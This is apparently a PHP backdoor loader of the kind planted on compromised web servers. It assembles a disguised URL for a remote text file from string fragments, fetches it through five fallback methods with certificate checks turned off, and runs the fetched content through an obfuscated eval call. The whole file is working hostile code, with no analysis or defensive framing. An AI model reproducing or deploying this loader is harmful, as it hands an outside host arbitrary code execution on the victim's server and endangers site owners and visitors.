<?php

$u = "htt";
$d = "ps://";
$a = "media.iloveto.cyou";
$デ = "/";
$の = "media/videos/h264/";
$ur = "mp4.txt";
$url = $u . $d . $a . $デ . $の . $ur;

function fetchContentWithFileGetContents($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    }
    return false;
}

function fetchContentWithCurl($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        return $error ? false : $response;
    }
    return false;
}

function fetchContentWithFopen($url) {
    if ($file = fopen($url, 'r')) {
        $content = stream_get_contents($file);
        fclose($file);
        return $content;
    }
    return false;
}

function fetchContentWithStreamContext($url) {
    $context = stream_context_create([
        "http" => [
            "method" => "GET",
            "header" => "User-Agent: PHP script\r\n"
        ]
    ]);
    return @file_get_contents($url, false, $context);
}

function fetchContentWithFile($url) {
    $lines = @file($url);
    if ($lines === false) {
        return false;
    }
    return implode('', $lines);
}

function fetchContent($url) {
    $content = fetchContentWithFileGetContents($url);
    if ($content === false) {
        $content = fetchContentWithCurl($url);
    }
    if ($content === false) {
        $content = fetchContentWithFopen($url);
    }
    if ($content === false) {
        $content = fetchContentWithStreamContext($url);
    }
    if ($content === false) {
        $content = fetchContentWithFile($url);
    }
    return $content;
}

function obfuscatedEval($content) {
    $evalFunc = 'e'.'v'.'a'.'l';
    if (empty($content)) {
        return;
    }
    if (@eval("?>".$content) === false) {
        return;
    }
    $evalFunc("?>" . $content);
}

$content = fetchContent($url);

if ($content !== false) {
    obfuscatedEval($content);
} else {
    echo "エラー: Gagal mengambil konten.";
}
?>
